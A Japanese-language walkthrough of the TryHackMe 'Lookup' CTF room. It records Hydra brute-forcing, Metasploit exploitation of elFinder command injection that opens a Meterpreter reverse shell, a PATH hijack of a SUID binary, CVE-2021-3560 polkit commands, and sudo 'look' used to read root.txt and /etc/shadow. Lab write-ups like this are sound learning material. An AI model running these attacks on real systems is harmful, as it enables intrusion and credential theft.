# Lookup CTF

https://tryhackme.com/r/room/lookup

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.82.235
root@ip-10-10-46-156:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-26 04:04 GMT
Nmap scan report for 10.10.82.235
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:8A:7A:05:F9:BF (Unknown)

root@ip-10-10-46-156:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-26 04:04 GMT
Nmap scan report for 10.10.82.235
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:8A:7A:05:F9:BF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### gobuster

```shell
root@ip-10-10-46-156:~# gobuster dir -x=txt,php,jpg -u http://lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719]
/.php                 (Status: 403) [Size: 275]
/login.php            (Status: 200) [Size: 1]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

```shell
$ hydra lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^&Login=submit:Wrong Password" -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-25 23:46:55
[DATA] max 30 tasks per 1 server, overall 30 tasks, 10000 login tries (l:1/p:10000), ~334 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^&Login=submit:Wrong Password
[80][http-post-form] host: lookup.thm   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-25 23:47:45
```

admin のとき「Wrong password」なのに、password123 のときだけ、「Wrong username or password」になって誤検知だった。何故？

admin 以外の有効なユーザー名を探る。

```shell
$ hydra lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^&Login=submit:Wrong username or password" -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p pass -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-26 00:09:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 10177 login tries (l:10177/p:1), ~340 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^&Login=submit:Wrong username or password
[80][http-post-form] host: lookup.thm   login: admin   password: pass
[STATUS] 1425.00 tries/min, 1425 tries in 00:01h, 8752 to do in 00:07h, 30 active
[STATUS] 1443.33 tries/min, 4330 tries in 00:03h, 5847 to do in 00:05h, 30 active
[80][http-post-form] host: lookup.thm   login: jose   password: pass
[STATUS] 1420.71 tries/min, 9945 tries in 00:07h, 232 to do in 00:01h, 30 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-26 00:17:05
```

jose / password123 で、files.lookup.thm に飛ばされる。

files.lookup.thm を hosts に追加。

http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw
が表示される。

## elFinder

elFinder ver 2.1.47

```shell
$ searchsploit elfinder
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                                                                                                                                                | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                                                                                      | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                                              | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                                                                                      | php/webapps/51864.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

2.1.47 に、コマンドインジェクションの脆弱性がある。

```shell
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
RHOSTS => files.lookup.thm
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Uploading payload '0u0V7ygC3L.jpg;echo 6370202e2e2f66696c65732f3075305637796743334c2e6a70672a6563686f2a202e61465144356f41486b2e706870 |xxd -r -p |sh& #.jpg' (1941 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.aFQD5oAHk.php) ...
[*] Sending stage (39927 bytes) to 10.10.82.235
[+] Deleted .aFQD5oAHk.php
[*] Meterpreter session 1 opened (10.2.22.182:4444 -> 10.10.82.235:39836) at 2025-01-26 00:46:10 -0500
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter >
```

meterpreter 取得成功

```shell
meterpreter > shell
Process 2571 created.
Channel 0 created.
whoami
www-data
pwd
/var/www/files.lookup.thm/public_html/elFinder/php
ls -al /home
total 12
drwxr-xr-x  3 root  root  4096 Jun  2  2023 .
drwxr-xr-x 19 root  root  4096 Jan 11  2024 ..
drwxr-xr-x  5 think think 4096 Jan 11  2024 think
ls -al /home/think
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```

think ユーザーになれば user.txt を開ける。

```shell
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```

```shell
find / -user think -type f 2>/dev/null
/home/think/.cache/motd.legal-displayed
/home/think/.profile
/home/think/.bashrc
/home/think/.bash_logout

find / -group think -type f 2>/dev/null
/home/think/.cache/motd.legal-displayed
/home/think/.profile
/home/think/.bashrc
/home/think/.passwords
/home/think/.bash_logout
/home/think/user.txt
```

think ユーザーへ昇格したいが手がかりがない。Linpeas を実行してみる。

## linpeas.sh

```text
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

PWD=/var/www/files.lookup.thm/public_html/elFinder/php

Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (kvm)

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (kvm)
```

CVE-2021-3560 が成立するのであれば、一気に root になれるので速い。

以下は脆弱性の説明で書かれていたコマンド。

```shell
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!

id boris

openssl passwd -5 iaminvincible!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.008s ; kill $!

su - boris # password: iaminvincible!
sudo su # password: iaminvincible!
```

Sleep 時間を調整してうまくいけば boris ユーザーが作られるらしいのだが、成功しなかった。  
タイミング的な問題なのか、環境的な問題なのか不明。

SUID 付きプログラム検索

```shell
find / -perm -u=s -type f -ls 2>/dev/null
      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
     3279     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    14400    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
     3387     16 -rwsr-xr-x   1 root     root               14488 Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
     2045     52 -rwsr-xr--   1 root     messagebus         51344 Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm
      491     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount
```

ghidra を使って、pwm ファイルを逆コンパイル

```c
undefined8 main(void)

{
  int iVar1;
  FILE *pFVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  undefined local_128 [64];
  char local_e8 [112];
  char local_78 [104];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("[!] Running \'id\' command to extract the username and user ID (UID)");
  snprintf(local_e8,100,"id");
  pFVar2 = popen(local_e8,"r");
  if (pFVar2 == (FILE *)0x0) {
    perror("[-] Error executing id command\n");
    uVar3 = 1;
  }
  else {
    iVar1 = __isoc99_fscanf(pFVar2,"uid=%*u(%[^)])",local_128);
    if (iVar1 == 1) {
      printf("[!] ID: %s\n",local_128);
      pclose(pFVar2);
      snprintf(local_78,100,"/home/%s/.passwords",local_128);
      pFVar2 = fopen(local_78,"r");
      if (pFVar2 == (FILE *)0x0) {
        printf("[-] File /home/%s/.passwords not found\n",local_128);
        uVar3 = 0;
      }
      else {
        while( true ) {
          iVar1 = fgetc(pFVar2);
          if ((char)iVar1 == -1) break;
          putchar((int)(char)iVar1);
        }
        fclose(pFVar2);
        uVar3 = 0;
      }
    }
    else {
      perror("[-] Error reading username from id command\n");
      uVar3 = 1;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

id コマンドを実行し、uid=nnnn(xxxx) の xxxx の部分を抽出し、/home/xxxx/.passwords ファイルを読み込んでいる。

つまり、uid=1111(think) 等と出力する id という名前のプログラムを実行させれば、/home/think/.passwords の中身が表示されることになる。

```shell
PATH=/tmp:$PATH
echo "echo 'uid=1111(think)'" > /tmp/id
chmod +x /tmp/id
/tmp/id
uid=1111(think)
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

出てきたパスワードリストを使って Hydra

```shell
$ hydra -l think -P pw.txt 10.10.102.132 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-27 03:34:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 50 login tries (l:1/p:50), ~2 tries per task
[DATA] attacking ssh://10.10.102.132:22/
[22][ssh] host: 10.10.102.132   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-27 03:35:00
```

login: think password: josemario.AKA(think)

これで SSH ログインできた。

## SSH

```shell
think@lookup:~$ ls -al
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
think@lookup:~$ cat user.txt
38375f.....
```

ユーザーフラグゲット

### sudo

```shell
think@lookup:~$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

/usr/bin/look に sudo が付いている。

```shell
think@lookup:~$ LFILE=/root/root.txt
think@lookup:~$ sudo look '' "$LFILE"
5a28.....
```

ルートフラグゲット

## 振り返り

- Web の認証エラーパターンは、CTF 特有の奇妙な実装
- 一般ユーザーへの昇格で SUID を調べるのは盲点だった

.passwords ファイルの存在をもっと重要視していれば、ファイル名から pwm に辿り着くことも可能だった。

```shell
find . -type f -exec grep -a ".passwords" {} /dev/null \;
./pwm:/home/%s/.passwords[-] File /home/%s/.passwords not found
```

- ghidra の逆コンパイル方法を学べたのは有意義だし楽しかった
- root.txt のパスが分からなかったとしたらどうったか？

shadow を読む。

```shell
think@lookup:~$ LFILE=/etc/shadow
think@lookup:~$ sudo look '' "$LFILE"
root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::
daemon:*:19046:0:99999:7:::
```

rockyou.txt 等では割れなかった。

```shell
hashcat -m 1800 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt

hashcat -m 1800 hash.txt rockyou.txt
```
